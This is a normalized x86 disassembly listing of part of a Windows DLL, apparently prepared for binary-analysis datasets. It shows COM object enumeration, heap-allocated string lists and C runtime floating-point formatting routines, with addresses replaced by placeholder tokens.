mov ecx [ rw-data ]
lea edx [ ebp - 0x230 ]
mov [ ecx + 0x4304 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x5c0 ]
mov [ ecx + 0x440c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x6b4 ]
mov [ ecx + 0x4514 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x461c ] eax
mov eax [ rw-data ]
lea edx [ ebp - 0x1c0 ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb88 ]
mov [ ecx + 0x4724 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa84 ]
mov [ ecx + 0x482c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xbe0 ]
mov [ ecx + 0x4934 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1f8 ]
mov [ ecx + 0x4a3c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x450 ]
mov [ ecx + 0x4b44 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x7d4 ]
mov [ ecx + 0x4c4c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x8ac ]
mov [ ecx + 0x4d54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1a4 ]
mov [ ecx + 0x4e5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4b0 ]
mov [ ecx + 0x4f64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc38 ]
mov [ ecx + 0x506c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x510 ]
mov [ ecx + 0x5174 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x214 ]
mov [ ecx + 0x527c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2d8 ]
mov [ ecx + 0x5384 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x8f4 ]
mov [ ecx + 0x548c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xe0 ]
mov [ ecx + 0x5594 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x370 ]
mov [ ecx + 0x569c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x24c ]
mov [ ecx + 0x57a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x530 ]
mov [ ecx + 0x58ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x470 ]
mov [ ecx + 0x59b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3b0 ]
mov [ ecx + 0x5abc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x78c ]
mov [ ecx + 0x5bc4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2a0 ]
mov [ ecx + 0x5ccc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x5dd4 ] eax
lea edx [ ebp - 0xfc ]
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa8 ]
mov [ ecx + 0x5edc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x744 ]
mov [ ecx + 0x5fe4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x768 ]
mov [ ecx + 0x60ec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xbb4 ]
mov [ ecx + 0x61f4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x6d8 ]
mov [ ecx + 0x62fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x6fc ]
mov [ ecx + 0x6404 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x134 ]
mov [ ecx + 0x650c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xaac ]
mov [ ecx + 0x6614 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x671c ] eax
jmp r-xdata
sub_100352e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f309
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
push edi
push edi
call [ CoInitializeEx@IAT ]
test eax eax
jns r-xdata
lea eax [ ebp - 0x20 ]
push eax
push r--data
push 0x1
push edi
push r--data
mov [ ebp - 0x20 ] edi
call [ CoCreateInstance@IAT ]
cmp eax edi
jge r-xdata
lea eax [ edi + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ VariantInit@IAT ]
lea ecx [ ebp - 0x4c ]
push ecx
call esi
mov [ ebp - 0x4 ] edi
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x40 ]
mov edi [ ebp - 0x4c ]
mov ebx [ ebp - 0x48 ]
lea ecx [ ebp - 0xa4 ]
push ecx
mov [ ebp - 0xac ] edx
mov [ ebp - 0xa8 ] eax
call esi
mov eax [ ebp - 0xa0 ]
mov edx [ ebp - 0xa4 ]
mov ecx [ ebp - 0x9c ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] edx
mov edx [ ebp - 0x98 ]
lea eax [ ebp - 0x94 ]
push eax
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x50 ] edx
call esi
mov edx [ ebp - 0x90 ]
mov ecx [ ebp - 0x94 ]
mov eax [ ebp - 0x8c ]
mov [ ebp - 0x68 ] edx
mov [ ebp - 0x6c ] ecx
mov ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x84 ]
push edx
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x60 ] ecx
call esi
mov [ ebp - 0x4 ] 0x3
mov esi [ ebp - 0xac ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0xa8 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x5c ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x58 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x54 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x50 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x6c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x68 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x64 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x60 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x84 ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x80 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x7c ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x78 ]
mov [ eax + 0xc ] esi
mov eax [ edx + 0x28 ]
push ecx
call eax
mov esi [ VariantClear@IAT ]
lea ecx [ ebp - 0x84 ]
push ecx
mov edi eax
call esi
lea edx [ ebp - 0x94 ]
push edx
call esi
lea eax [ ebp - 0xa4 ]
push eax
call esi
lea ecx [ ebp - 0x4c ]
push ecx
mov [ ebp - 0x4 ] 0xffffffff
call esi
xor ebx ebx
cmp edi ebx
jge r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x74 ]
push ecx
mov edi r--data
mov [ ebp - 0x14 ] ebx
call sub_100285a0
mov [ ebp - 0x4 ] 0x4
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
call [ CoUninitialize@IAT ]
lea eax [ ebx + 0x3 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x18 ]
push edx
mov [ ebp - 0x18 ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x38 ]
call eax
test eax eax
jns r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
lea edi [ ebp - 0x14 ]
push edi
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
lea edi [ ebp - 0x74 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] 0xffffffff
call sub_10005b80
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ ebp - 0x38 ] ebx
jge r-xdata
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp eax ebx
jl r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x5
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
je r-xdata
xor eax eax
cmp ecx ebx
jle r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x7
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx 0x3
mov [ ebp - 0x4c ] cx
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x4 ] 0x5
mov ebx [ ebp - 0x4c ]
mov edx [ ebp - 0x18 ]
mov edi [ edx ]
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x48 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x40 ]
push edx
mov edx [ edi + 0x20 ]
mov [ eax + 0xc ] ecx
call edx
mov edi eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0xffffffff
call esi
xor ebx ebx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x34 ]
jl r-xdata
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x4c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov edi eax
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
lea edx [ ebp - 0x3c ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x3c ]
cmp ecx ebx
je r-xdata
xor eax eax
cmp ecx ebx
jle r-xdata
lea esp [ esp ]
mov eax ebx
xor ebx ebx
cmp eax [ ebp - 0x3c ]
jl r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
lea edx [ ebp - 0x70 ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
test eax eax
js r-xdata
mov [ ebp - 0x28 ] ebx
lea ebx [ eax + 0x1 ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push ebx
push eax
mov eax [ ecx + 0x20 ]
call eax
test eax eax
js r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] 0x0
mov ecx [ eax ]
push edx
mov edi eax
push eax
mov eax [ ecx + 0x28 ]
call eax
test eax eax
js r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
push ecx
push edx
call [ StrStrW@IAT ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov ecx [ eax ]
push 0x0
push edx
push eax
mov eax [ ecx + 0x3c ]
call eax
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10035802
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10051880
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_1003589f
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x8c ]
call sub_10017366
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1002868d
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_10025acc
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x88 ]
fld [ ebp + 0x1c ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_10035a60
push ebp
mov ebp esp
mov eax [ esi ]
push edi
mov edi [ GetProcessHeap@IAT ]
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
lea ecx [ edx * 4 + 0x4 ]
push ecx
push eax
push 0x8
call edi
push eax
call [ HeapReAlloc@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ eax * 4 + 0x4 ]
push ecx
push 0x8
call edi
push eax
call [ HeapAlloc@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov [ esi ] eax
mov eax 0x2
pop edi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ lstrlenW@IAT ]
push edx
call ebx
lea eax [ eax + eax + 0x2 ]
push eax
push 0x8
call edi
push eax
call [ HeapAlloc@IAT ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov [ edx + ecx * 4 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
mov eax 0x1
pop edi
pop ebp
retn 0x4
mov edi [ ebp + 0x8 ]
push edi
call ebx
mov edx [ esi + 0x4 ]
add eax eax
push eax
mov eax [ esi ]
mov ecx [ eax + edx * 4 ]
push edi
push ecx
call sub_10078600
inc [ esi + 0x4 ]
add esp 0xc
pop ebx
xor eax eax
pop edi
pop ebp
retn 0x4
pop ebx
mov eax 0x3
pop edi
pop ebp
retn 0x4
sub_10035b1e
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi 0xffff
push esi
push 0x133f
call sub_10042493
fld [ ebp + 0x8 ]
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov edi eax
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_1001673e
pop ecx
pop ecx
test eax eax
jle r-xdata
push esi
push edi
call sub_10042493
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_100520c2
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
add esp 0xc
test eax eax
jns r-xdata
fld [ ebp + 0x8 ]
push edi
fadd [ r--data ]
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x8
cmp eax 0x2
jle r-xdata
fld [ ebp + 0x8 ]
mov edx 0x7fffffff
sub edx eax
cmp ecx edx
jg r-xdata
mov edx 0x80000000
sub edx eax
cmp ecx edx
jl r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x3
jne r-xdata
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ rw-data ]
fstp [ esp ]
call sub_1001e46f
fstp [ esp + 0x8 ]
fild [ ebp + 0x10 ]
fstp [ esp ]
push ecx
push ecx
add eax ecx
cmp eax 0xa00
jle r-xdata
fmul [ r--data ]
jmp r-xdata
fild [ ebp + 0x10 ]
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
call sub_10046f20
add esp 0x18
jmp r-xdata
call sub_10049bd8
add esp 0x24
jmp r-xdata
cmp eax 0x400
jle r-xdata
cmp eax 0xfffff603
jge r-xdata
add eax 0xfffffa00
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10040092
add esp 0xc
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
jmp r-xdata
cmp eax 0xfffffc03
jge r-xdata
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x11
jmp r-xdata
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10040092
push esi
fstp [ ebp + 0x8 ]
push edi
call sub_10042493
add esp 0x14
add eax 0x600
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10040092
add esp 0xc
jmp r-xdata
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x12
jmp r-xdata
sub_10035ce3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_10078c40
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_10035d10
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor ecx ecx
mov [ esi ] cx
pop esi
retn
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
sub_10035d40
push ebp
mov ebp esp
push ecx
mov eax [ eax + 0x1c ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor eax eax
mov esp ebp
pop ebp
retn 0x8
mov eax 0x1
mov esp ebp
pop ebp
retn 0x8
sub_10035d92
mov edi edi
push esi
push edi
mov esi ecx
call sub_1006181f
mov edi eax
test edi edi
je r-xdata
mov esi [ esi + 0x4 ]
mov eax esi
test esi esi
jne r-xdata
lea ecx [ esi + 0x4 ]
push edi
call sub_1005daf0
push edi
call sub_10020a90
pop ecx
pop edi
pop esi
retn
mov eax r--data
sub_10035dc4
push 0x4c
mov eax sub_1007eb7c
call sub_10007703
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x58 ] ebx
call sub_1001d4e2
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_1005e05a
xor esi esi
add esp 0xc
movzx ebx ax
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000fa70
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] bx
jb r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_10024aa0
mov eax ebx
call sub_10019c00
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10050f80
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
movzx eax [ eax ]
lea ecx [ ebx + 0x9 ]
cmp ecx eax
jge r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
mov al [ eax + esi * 2 ]
sub al bl
add al 0x30
movzx eax al
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10050f80
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_1001905b
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
mov ebx [ ebp - 0x58 ]
sub_10035f20
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x14
push esi
mov esi ecx
lea ecx [ ebp - 0x10 ]
push ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10062021
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x14 ] eax
add esp 0x4
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10035f61
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
